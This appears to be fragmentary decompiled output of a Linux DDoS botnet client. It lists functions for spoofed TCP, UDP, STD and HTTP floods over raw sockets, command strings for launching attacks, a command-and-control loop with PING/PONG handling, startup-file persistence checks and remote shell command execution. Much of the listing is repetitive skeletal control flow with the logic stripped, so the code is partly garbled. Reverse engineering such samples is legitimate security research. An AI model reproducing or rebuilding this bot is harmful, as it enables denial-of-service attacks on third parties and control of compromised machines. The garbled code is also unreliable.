                                                                        Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                    if (listFork() == 0) {
                                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v255, v256, v257);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                if (listFork() == 0) {
                                                                    sendSTD(v255, v256, v257);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v255, v256, v257);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                if (listFork() == 0) {
                                                                                                    sendSTD(v255, v256, v257);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                            if (listFork() == 0) {
                                                                sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v255, v256, v257);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                            Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                        if (listFork() == 0) {
                                                                                            sendSTD(v255, v256, v257);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                        Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                while (true) {
                                                                    if (listFork() == 0) {
                        Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendSTD(v255, v256, v257);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                    Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                if (listFork() == 0) {
                                                    sendSTD(v255, v256, v257);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                            if (listFork() == 0) {
                                Rootsprintf(v191, (int32_t)"HTTP %s Flooding %s:%d for %d seconds", v195);
                                sendHTTP(v221, v195, (int16_t)(v222 % 0x10000), v194, v193, v224);
                                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                            Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                if (listFork() == 0) {
                                                                                    sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                    Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                if (listFork() == 0) {
                                                                    sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                        if (listFork() == 0) {
                                                            sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                            while (true) {
                                                                if (listFork() == 0) {
                    Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                if (listFork() == 0) {
                                                    sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                    while (true) {
                                                        if (listFork() == 0) {
=================FUNCTION : main ===================
++++++++ FUNCTION START 19243
++++++++ FUNCTION END 20077
++++++++ FUNCTION LENGTH 834
    srand(v188 ^ __libc_getpid());
    init_rand(v189 ^ __libc_getpid());
    int32_t v190 = __GI_fopen((int32_t)"/etc/rc.d/rc.local", (int32_t)"r"); // 0x10006bac
        v191 = __GI_fopen((int32_t)"/etc/rc.conf", (int32_t)"r");
        getcwd(v207, 256);
            __GI_fclose((int16_t *)v191);
                sprintf(v213, (int32_t)"\"%s%s\"\n", v207, v212 + v216, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", v209, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", (int32_t)&v215);
                while (true) {
                    while (true) {
                            fgets(v214, 1024, v191);
                            if (__GI_strcasecmp(v214, v213) == 0) {
                            __GI_fclose((int16_t *)v191);
                            int32_t v219 = __GI_fopen((int32_t)v192, (int32_t)&v218); // 0x10006d20
                                __GI_fclose((int16_t *)v219);
                            getOurIP();
                            v200 = __libc_fork();
                                if (__libc_fork() == 0) {
                                    zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                while (true) {
                                    if (initConnection() != 0) {
                                        while (true) {
                                            if (initConnection() == 0) {
                                        v225 = __GI_inet_ntoa(&v224, 0x10020000);
                                        getBuild();
                                        Rootsprintf(v222, (int32_t)&v220, v225);
                                        while (true) {
                                            while (true) {
                                                if (recvLine(v194, (char *)&v195, 0x1000, v204) == -1) {
                                                while (true) {
                                                                if (__libc_waitpid(v233, 0, 1) >= 1) {
                                                                    while (true) {
                                                                                while (true) {
                                                                                            free();
                                                        if (strstr(v204, "PING", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") == v204) {
                                                            Rootsprintf(v194, (int32_t)"PONG", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                            if (strstr(v204, "LELIMDUP", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") == v204) {
                                                                zprintf((int32_t)"PEACE OUT IMMA DUP\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                        while (true) {
                                                            if (initConnection() == 0) {
                                                        while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                                    while (true) {
                                                                                    processCmd(v258, &v210);
                                                                                processCmd(v258, &v210);
                                                                            while (true) {
                                                                            free();
                                                                                free();
                                                                            while (true) {
                                                    if (__libc_waitpid(v233, 0, 1) < 1) {
                                    v225 = __GI_inet_ntoa(&v224, 0x10020000);
                                    getBuild();
                                    Rootsprintf(v222, (int32_t)&v220, v225);
                                __libc_waitpid(v200, (int32_t)&v197, 0);
                                zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                            while (true) {
                                if (initConnection() == 0) {
            sprintf(v213, (int32_t)"\"%s%s\"\n", v207, v212 + v205, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", v209, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", (int32_t)&v215);
            while (true) {
        getOurIP();
        v200 = __libc_fork();
            if (__libc_fork() == 0) {
                zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
            while (true) {
                if (initConnection() == 0) {
            __libc_waitpid(v200, (int32_t)&v197, 0);
            zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
        while (true) {
            if (initConnection() == 0) {
    getOurIP();
    v200 = __libc_fork();
        if (__libc_fork() == 0) {
            zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
        while (true) {
            if (initConnection() == 0) {
        __libc_waitpid(v200, (int32_t)&v197, 0);
        zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
    while (true) {
        if (initConnection() == 0) {
    szprintf(v202, (int32_t)"%s 2>&1", v201);
    int32_t v267 = fdpopen(v202, "r"); // 0x1000748c
    while (true) {
        if (fdgets(v202, 1024, v267) == 0) {
            fdpclose(v267);
            Rootsprintf(v194, (int32_t)"%s", v202);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 40938
++++++++ FUNCTION END 42010
++++++++ FUNCTION LENGTH 1072
    int32_t v196 = __get_hosts_byname_r(a1, 2, (int32_t)a2, a3, a4, a5, a6); // 0x1000a8c0
                                        v225 = inet_aton((char *)a1);
                                        __open_nameservers();
                                        v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                            free();
                                            free();
                                                    while (true) {
                                            free();
                                                free();
                                                free();
                                            v225 = inet_aton((char *)a1);
                                            __open_nameservers();
                                            v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                                free();
                                                free();
                                                        while (true) {
                                                            free();
                                                                free();
                                                            free();
                                                free();
                                                    free();
                                                    free();
                            v225 = inet_aton((char *)a1);
                            __open_nameservers();
                            v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                free();
                                free();
                                        while (true) {
                                            free();
                                                free();
                                            free();
                                free();
                                    free();
                                    free();
                                v225 = inet_aton((char *)a1);
                                __open_nameservers();
                                v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                free();
                                    free();
                                        free();
                                        free();
                        v225 = inet_aton((char *)a1);
                            __open_nameservers();
                            v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                    free();
                                    free();
                                            while (true) {
                                                free();
                                                    free();
                                                    free();
                                    free();
                                        free();
                                        free();
                            v225 = inet_aton((char *)a1);
                                __open_nameservers();
                                v226 = __dns_lookup((char *)a1, 1, v198, (int32_t)&v199, (int32_t)&v205, (int32_t)&v204);
                                        free();
                                        free();
                                                while (true) {
                                                    free();
                                                        free();
                                                        free();
                                        free();
                                            free();
                                            free();
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 63705
++++++++ FUNCTION END 64666
++++++++ FUNCTION LENGTH 961
                        while (true) {
                            while (true) {
                                    __libc_close(v210);
                                        if (inet_pton(10, (char *)v220, (int32_t)&v221) < 1) {
                                            inet_addr(v220);
                                        int32_t v224 = socket((int32_t)v223, 2, 17); // 0x1000dc1c
                                            if (__libc_connect(v207, 28, 28) > -1) {
                                                __libc_send(v194, v191, result + v227, 0);
                                                    int32_t v228 = __libc_recv(v194, v191, 512, 0); // 0x1000dc9c
                                                                                __libc_close(v196);
                                                                            free();
                                                                            free();
                                                                            while (true) {
                                                                                        __libc_close(v194);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        free();
                                                                                                free();
                                                                                            free();
                                                                                        __libc_close(v194);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                        __libc_close(v194);
                                                                                            free();
                                                                                            free();
                                                                                        free();
                                                                                    __libc_close(v194);
                                                                                        free();
                                                                                        free();
                                                                                    free();
                                                                            __libc_close(v194);
                                                                                free();
                                                                                free();
                                                                            free();
                                                                        __libc_close(v194);
                                                                            free();
                                                                            free();
                                                                        free();
                                                                        free();
                                                                        __libc_close(v196);
                                                                    free();
                                                                    free();
                                                                    __libc_close(v196);
                                                                free();
                                                                free();
                                __libc_close(v196);
                            free();
                            free();
                        __libc_close(v196);
                    free();
                    free();
                    __libc_close(v196);
                free();
                free();
                __libc_close(v196);
            free();
            free();
            __libc_close(v196);
        free();
        free();
        __libc_close(v196);
    free();
    free();
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 57325
++++++++ FUNCTION END 61292
++++++++ FUNCTION LENGTH 3967
            while (true) {
                while (true) {
                                    while (true) {
                                                                                    while (true) {
                                                                                                        while (true) {
                                                                                                    while (true) {
                                                                                                while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                                    while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                            while (true) {
        while (true) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 10321
++++++++ FUNCTION END 10729
++++++++ FUNCTION LENGTH 408
    char v192 = random() % 223;
    char v193 = random() % 255;
    char v194 = random() % 255;
    char v195 = random() % 255;
    while (true) {
                                            v192 = random() % 223;
                                            v193 = random() % 255;
                                            v194 = random() % 255;
                                            v195 = random() % 255;
                                                                szprintf(v203, (int32_t)"%d.%d.%d.%d", v198);
                                                                return inet_addr(v203);
                                v192 = random() % 223;
                                v193 = random() % 255;
                                v194 = random() % 255;
                                v195 = random() % 255;
                            v192 = random() % 223;
                            v193 = random() % 255;
                            v194 = random() % 255;
                            v195 = random() % 255;
                        v192 = random() % 223;
                        v193 = random() % 255;
                        v194 = random() % 255;
                        v195 = random() % 255;
                    v192 = random() % 223;
                    v193 = random() % 255;
                    v194 = random() % 255;
                    v195 = random() % 255;
                v192 = random() % 223;
                v193 = random() % 255;
                v194 = random() % 255;
                v195 = random() % 255;
            v192 = random() % 223;
            v193 = random() % 255;
            v194 = random() % 255;
            v195 = random() % 255;
        v192 = random() % 223;
        v193 = random() % 255;
        v194 = random() % 255;
        v195 = random() % 255;
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4648
++++++++ FUNCTION END 5157
++++++++ FUNCTION LENGTH 509
            v201 = __vfork();
                __libc_close(v198);
                __libc_close(v199);
                            __libc_close(v199);
                        __libc_close(v198);
                            __libc_close(v198);
                        __libc_close(v199);
                    __libc_close(v199);
                    __libc_close(v205);
        v202 = getdtablesize(0x10020000);
        v201 = __vfork();
            __libc_close(v198);
            __libc_close(v199);
                        __libc_close(v199);
                    __libc_close(v198);
                        __libc_close(v198);
                    __libc_close(v199);
                __libc_close(v199);
                __libc_close(v205);
        v201 = __vfork();
            __libc_close(v198);
            __libc_close(v199);
                        __libc_close(v199);
                    __libc_close(v198);
                        __libc_close(v198);
                    __libc_close(v199);
                __libc_close(v199);
                __libc_close(v205);
    v202 = getdtablesize(0x10020000);
    v201 = __vfork();
        __libc_close(v198);
        __libc_close(v199);
                    __libc_close(v199);
                __libc_close(v198);
                    __libc_close(v198);
                __libc_close(v199);
            __libc_close(v199);
            __libc_close(v205);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 13410
++++++++ FUNCTION END 13862
++++++++ FUNCTION LENGTH 452
        rand_cmwc();
    int32_t result = getHost(a1, &v196, v195); // 0x10005400
    int32_t v197 = socket(2, 3, 6); // 0x10005438
        result2 = Rootsprintf(v198, (int32_t)"Failed opening raw socket.", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
    if (__GI_setsockopt(v197, 0, 3, (int32_t)&v199, 4) > -1) {
        int32_t v206 = GetRandomIP(v200); // 0x1000555c
        *v205 = (int16_t)rand_cmwc();
        int32_t v208 = rand_cmwc(); // 0x100055a4
                while (true) {
                        if (__GI_strcoll(v223, (int32_t)"rst") == 0) {
                                    if (__GI_strcoll(v223, (int32_t)"psh") == 0) {
                                        Rootsprintf(v198, (int32_t)"Invalid flag \"%s\"", v222);
                rand_cmwc();
                    rand_cmwc();
                *v216 = (int16_t)tcpcsum(v203, v215, v204);
                while (true) {
                    __libc_sendto(v197, v203, v201, 0, v195, 16, v195);
                    v212 = GetRandomIP(v200);
                    *(int16_t *)(v203 | 4) = (int16_t)rand_cmwc();
                    *v209 = rand_cmwc();
                    *v205 = (int16_t)rand_cmwc();
                    *v216 = (int16_t)tcpcsum(v203, v215, v204);
        rand_cmwc();
            rand_cmwc();
        *v216 = (int16_t)tcpcsum(v203, v215, v204);
        while (true) {
            __libc_sendto(v197, v203, v201, 0, v195, 16, v195);
            v212 = GetRandomIP(v200);
            *(int16_t *)(v203 | 4) = (int16_t)rand_cmwc();
            *v209 = rand_cmwc();
            *v205 = (int16_t)rand_cmwc();
            *v216 = (int16_t)tcpcsum(v203, v215, v204);
        result2 = Rootsprintf(v198, (int32_t)"Failed setting raw headers mode.", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2552
++++++++ FUNCTION END 3184
++++++++ FUNCTION LENGTH 632
                while (true) {
                    printchar((int32_t *)a1, v198);
                            printchar((int32_t *)a1, v198);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v205);
                        printchar((int32_t *)a1, v198);
                    printchar((int32_t *)a1, v198);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v205);
                printchar((int32_t *)a1, v198);
                while (true) {
                    printchar((int32_t *)a1, v198);
                            printchar((int32_t *)a1, v198);
                printchar((int32_t *)a1, (int32_t)*a2);
                    printchar((int32_t *)a1, (int32_t)*v205);
                        printchar((int32_t *)a1, v198);
                    printchar((int32_t *)a1, v198);
        printchar((int32_t *)a1, (int32_t)*a2);
            printchar((int32_t *)a1, (int32_t)*v205);
                printchar((int32_t *)a1, v198);
            while (true) {
                printchar((int32_t *)a1, v198);
                        printchar((int32_t *)a1, v198);
            printchar((int32_t *)a1, (int32_t)*a2);
                printchar((int32_t *)a1, (int32_t)*v205);
                    printchar((int32_t *)a1, v198);
                printchar((int32_t *)a1, v198);
    printchar((int32_t *)a1, (int32_t)*a2);
        printchar((int32_t *)a1, (int32_t)*v205);
            printchar((int32_t *)a1, v198);
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 13000
++++++++ FUNCTION END 13407
++++++++ FUNCTION LENGTH 407
        rand_cmwc();
    int32_t result = getHost(a1, &v197, v196); // 0x10004d74
        int32_t v200 = socket(2, 2, 17); // 0x10004dbc
            result3 = Rootsprintf(v198, (int32_t)"Failed opening raw socket.", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                makeRandomStr(v201, a5);
                while (true) {
                    while (true) {
                        __libc_sendto(v200, v201, a5, 0, v196, 16, v196);
                                rand_cmwc();
    int32_t v207 = socket(2, 3, 17); // 0x10004f40
        if (__GI_setsockopt(v207, 0, 3, (int32_t)&v208, 4) > -1) {
                srand(v209 ^ rand_cmwc());
                init_rand(random());
            int32_t v214 = GetRandomIP(v210); // 0x100050c0
            *v213 = (int16_t)rand_cmwc();
                v216 = rand_cmwc();
            makeRandomStr(v212 + 28, a5);
            while (true) {
                while (true) {
                    __libc_sendto(v207, v212, a5 + 28, 0, v196, 16, v196);
                    *v213 = (int16_t)rand_cmwc();
                        v228 = rand_cmwc();
                    *(int16_t *)(v212 | 4) = (int16_t)rand_cmwc();
                    *(int32_t *)(v212 | 12) = htonl(GetRandomIP(v210));
            result5 = Rootsprintf(v198, (int32_t)"Failed setting raw headers mode.", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
    result5 = Rootsprintf(v198, (int32_t)"Failed opening raw socket.", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 72579
++++++++ FUNCTION END 73235
++++++++ FUNCTION LENGTH 656
            while (true) {
                if (fgets(v198, v200, a1) != 0) {
                    __GI_fclose((int16_t *)a1);
                                v204 = __open_etc_hosts();
                                    while (true) {
                                        if (fgets(v198, v200, a1) != 0) {
                                            __GI_fclose((int16_t *)a1);
        while (true) {
            if (fgets(v198, v200, a1) != 0) {
                    while (true) {
                            while (true) {
                                        while (true) {
                                        while (true) {
                                            if (__GI_strcasecmp(a2, v234) == 0) {
                                            if (inet_pton(2, (char *)v236, v199) > 0) {
                                                    __GI_fclose((int16_t *)a1);
                                                if (inet_pton(10, (char *)v237, v197) > 0) {
                                                        __GI_fclose((int16_t *)a1);
                                __GI_fclose((int16_t *)a1);
                __GI_fclose((int16_t *)a1);
            __GI_fclose((int16_t *)a1);
                            v204 = __open_etc_hosts();
                                while (true) {
                                    if (fgets(v198, v200, a1) != 0) {
                                        __GI_fclose((int16_t *)a1);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 31380
++++++++ FUNCTION END 32426
++++++++ FUNCTION LENGTH 1046
        while (true) {
                while (true) {
                    while (true) {
                                        while (true) {
                                            while (true) {
                                                while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                            while (true) {
                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                            while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 18698
++++++++ FUNCTION END 19039
++++++++ FUNCTION LENGTH 341
    int32_t v196 = socket(2, 2, 0); // 0x10006818
    inet_addr((int32_t)"8.8.8.8");
    if (__libc_connect(v196, (int32_t)&v197, 16) == -1) {
    int32_t v201 = __GI_getsockname(v196, (int32_t)&v200, v199, v199); // 0x100068e4
        int32_t v202 = __libc_open((int32_t)"/proc/net/route", 0); // 0x10006928
        while (true) {
            if (fdgets(v204, 0x1000, v202) != 0) {
                if (strstr(v204, "\t00000000\t", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") != 0) {
                        __libc_close(v202);
                            __libc_close(v196);
                        __libc_close(v196);
                    __libc_close(v202);
                        __libc_close(v196);
                    __libc_close(v196);
            __libc_close(v202);
                __libc_close(v196);
            __libc_close(v196);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 50358
++++++++ FUNCTION END 50860
++++++++ FUNCTION LENGTH 502
                if (__GI_sigprocmask(0, (int32_t)&v203, v208) == 0) {
                            __GI_sigprocmask(2, v208, 0);
                            __GI_sigprocmask(2, v208, 0);
                            __GI_sigprocmask(2, v208, 0);
                        __GI_sigprocmask(2, v208, 0);
                        __GI_sigprocmask(2, v208, 0);
                        __GI_sigprocmask(2, v208, 0);
            if (__GI_sigprocmask(0, (int32_t)&v203, v208) == 0) {
                        __GI_sigprocmask(2, v208, 0);
                        __GI_sigprocmask(2, v208, 0);
